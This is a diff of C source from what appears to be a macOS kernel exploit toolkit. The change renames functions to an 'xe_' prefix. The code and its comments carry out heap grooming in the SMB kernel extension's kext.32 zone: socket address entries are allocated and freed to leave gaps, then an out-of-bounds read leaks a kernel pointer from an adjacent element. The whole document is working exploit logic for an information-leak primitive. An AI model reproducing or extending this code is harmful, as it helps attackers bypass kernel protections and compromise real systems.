@@ -45,14 +45,14 @@
 ///
 /// The member `addr` is used to store the memory location of associated socket address and the
 /// member `next` is used to refer to `previous` and `next` tailq entries. By reading the member
-/// `addr` using the OOB read provided by module oob_reader_base.c, we can determine the
+/// `addr` using the OOB read provided by module xe_oob_reader_base.c, we can determine the
 /// address of an allocated socket address.
 ///
 /// This module allocates multiple socket addresses with user provided data. This would lead to
 /// multiple `struct sock_addr_entry` allocations in kext.32 zone. Then it would free some of these
 /// allocated socket address which would also release the corresponding `struct sock_addr_entry`
 /// leading to creation of gaps in kext.32 zone. Then it would use the OOB read functionality
-/// provided by oob_reader_base.c to read succeeding kext.32 zone elements. It would validate
+/// provided by xe_oob_reader_base.c to read succeeding kext.32 zone elements. It would validate
 /// the members `addr` and `next` of the read data and verify it is a valid `struct sock_addr_entry`.
 /// If it is not valid, the process is repeated again, otherwise the value of pointer `addr` is
 /// returned to the caller
@@ -168,7 +168,7 @@ int xe_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, u
     xe_assert(zone_size > 0);
     
     smb_nic_allocator gap_allocator = smb_nic_allocator_create(smb_addr, sizeof(*smb_addr));
-    kmem_allocator_prpw_t element_allocator = kmem_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);
+    xe_allocator_prpw_t element_allocator = xe_allocator_prpw_create(smb_addr, NUM_GAP_ELEMENTS);
 
     /// Allocate alternating `struct sock_addr_entry` elements in kext.32 zone. First sock addr
     /// entry will be a placeholder element and second will have the member `addr` pointing
@@ -186,7 +186,7 @@ int xe_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, u
         xe_assert_err(error);
         
         /// Allocate a `struct sock_addr_entry` element with given data in memory pointed by `entry->addr`
-        error = kmem_allocator_prpw_allocate(element_allocator, alloc_size, sa_family, data, data_size, data_offset);
+        error = xe_allocator_prpw_allocate(element_allocator, alloc_size, sa_family, data, data_size, data_offset);
         xe_assert_err(error);
     }
     
@@ -212,7 +212,7 @@ int xe_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, u
         uint32_t local_name_size = snb_name;
         char local_nb_name[local_name_size];
         
-        struct oob_reader_base_args params;
+        struct xe_oob_reader_base_args params;
         params.smb_addr = *smb_addr;
         params.saddr_snb_len = nb_len;
         params.saddr_ioc_len = ioc_len;
@@ -222,7 +222,7 @@ int xe_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, u
         params.laddr_snb_name_seglen = snb_name;
         
         /// Allocate saddr and laddr in `kext.kalloc.32` zone and read their succeeding zone element
-        oob_reader_base_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
+        xe_oob_reader_base_read(&params, server_nb_name, &server_name_size, local_nb_name, &local_name_size);
         xe_assert_cond(server_name_size, ==, snb_name + 2);
         xe_assert_cond(local_name_size, ==, snb_name + 2);
         
@@ -244,7 +244,7 @@ int xe_kheap_alloc_try(const struct sockaddr_in* smb_addr, uint8_t alloc_size, u
         out->element_allocator = element_allocator;
         return 0;
     } else {
-        kmem_allocator_prpw_destroy(&element_allocator);
+        xe_allocator_prpw_destroy(&element_allocator);
         return EAGAIN;
     }
 }
